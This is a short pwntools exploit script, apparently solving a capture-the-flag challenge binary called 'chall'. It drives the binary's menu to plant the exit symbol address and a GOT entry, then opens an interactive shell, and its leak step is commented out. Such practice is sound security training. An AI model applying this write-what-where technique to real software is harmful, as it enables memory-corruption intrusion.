from pwn import *

elf = ELF("chall")
r = elf.process()
pause()


def menu(choice):
    r.sendlineafter("Your Choice > ", str(choice))


def where(data):
    menu(1)
    r.sendlineafter("want to: ", data)


def what(data):
    menu(2)
    r.sendlineafter(" vehicle id: ", "0")
    r.send(data)


def show(data="no"):
    menu(3)
    r.sendlineafter("Enter the vehicle id: ", "0")
    '''r.recvuntil("\n")
    leak=u64(r.recv(6).ljust(8,b"\x00"))
    print(hex(leak))
    r.recvuntil("\n")'''
    r.sendlineafter("Do you have any comments?\n", data)


where(p64(elf.sym['exit']))
what(p64(elf.got['__libc_start_main']))

show()
r.interactive()
